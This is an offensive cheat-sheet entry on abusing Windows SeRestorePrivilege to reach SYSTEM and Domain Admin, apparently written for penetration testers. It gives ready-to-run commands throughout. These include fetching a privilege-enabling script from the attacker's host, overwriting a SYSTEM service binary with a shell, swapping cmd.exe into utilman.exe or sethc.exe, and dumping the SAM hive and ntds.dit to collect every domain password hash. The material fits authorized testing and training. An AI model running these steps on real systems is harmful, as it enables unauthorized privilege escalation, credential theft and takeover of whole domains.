title: SeRestorePrivilege — Write-Anywhere → SYSTEM
body: SeRestorePrivilege grants write access to any file on the system regardless of its ACL, plus the ability to set the owner of any object. It's auto-assigned to the Server Operators group, and Backup Operators inherit it alongside SeBackupPrivilege. Multiple cash-ins: overwrite a SYSTEM service binary and restart it (works headless), swap cmd.exe into utilman.exe and trigger it from the lock screen (needs RDP/console), or plant a DLL a SYSTEM process loads. Paired with SeBackup on a Domain Controller it reads ntds.dit for every domain hash = Domain Admin. The privilege is usually present-but-Disabled and must be enabled first.
cmd:
# ⭐ PATH: enable the priv → overwrite a SYSTEM service binary (headless) or
#         swap cmd.exe into utilman.exe + Win+U at the lock screen (RDP) = SYSTEM.

# ══ ⭐ HAVE SeRestorePrivilege? — write ANY file, ignore DACLs, set owner ══
# "Restore files and directories" = write anywhere bypassing NTFS write ACLs AND
# set the owner of any object. Auto-granted to Server Operators, and to Backup
# Operators (which ALSO gives SeBackup = read any file). On a DC that pairing →
# read ntds.dit → Domain Admin. Enable it FIRST — usually present-but-Disabled.
whoami /priv | findstr /i SeRestore
iwr http://$lhost/Enable-Privilege.ps1 -OutFile ep.ps1 ; . .\ep.ps1   # or EnableAllTokenPrivs.ps1

# ══════════════════════════════════════════════════════
# A) SERVICE BINARY REPLACEMENT → SYSTEM   (works HEADLESS — WinRM ok)
# ══════════════════════════════════════════════════════
sc query state= all
sc qc <ServiceName>                 # find one running as SYSTEM, note BINARY_PATH_NAME
copy /y C:\Windows\Temp\shell.exe "C:\Path\To\Service.exe"   # overwrite it
sc stop <ServiceName> & sc start <ServiceName>               # (or reboot w/ SeShutdown)

# ══════════════════════════════════════════════════════
# B) UTILMAN / STICKY-KEYS SWAP → SYSTEM   (needs RDP/console lock screen)
# ══════════════════════════════════════════════════════
takeown /f C:\Windows\System32\utilman.exe
copy C:\Windows\System32\utilman.exe C:\Windows\Temp\utilman.old      # BACKUP first
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# lock the session (Win+L) → on the LOCK SCREEN press Win+U → SYSTEM cmd.
# (sethc.exe + SHIFT x5 works identically.) Needs a lock screen → useless over WinRM.

# ══════════════════════════════════════════════════════
# C) DLL HIJACK — write into System32 → plant a loaded DLL   → win_dll_hijack
# ══════════════════════════════════════════════════════
# SeRestore writes System32 too → same routes as SeManageVolume
# (Printconfig/PrintNotify, WerTrigger = SYSTEM). Full detail → win_dll_hijack.

# ══════════════════════════════════════════════════════
# D) PAIRED WITH SeBackup (Server/Backup Operators) → DC = DA
# ══════════════════════════════════════════════════════
# You almost always hold SeBackup too (read any file, bypass ACL):
reg save HKLM\SAM sam & reg save HKLM\SYSTEM system   # local hives → secretsdump
# on a DC: diskshadow to snapshot C:, robocopy the ntds.dit out, then
# impacket-secretsdump -ntds ntds.dit -system system LOCAL → every domain hash → DA.

# ── GOTCHAS ──────────────────────────────────────────
# - ENABLE the priv first (Disabled by default): Enable-SeRestorePrivilege / EnableAllTokenPrivs.
# - Utilman/sethc swap needs a LOCK SCREEN (RDP/console) — over WinRM use A or C.
# - Back up any binary you overwrite (utilman.old) so you can restore it.
# - AV may flag the swapped cmd.exe / planted service binary.
warn: ENABLE SeRestore first — it's Disabled by default and does nothing until enabled (Enable-SeRestorePrivilege / EnableAllTokenPrivs.ps1). The utilman/sethc swap needs a LOCK SCREEN (RDP or console) — it's useless over a pure WinRM shell, so use service-binary replacement (A) or DLL hijack (C) when headless. Always back up a binary before overwriting it. On a DC, Server/Backup Operators = Domain Admin via ntds.dit — don't overlook the SeBackup pairing.
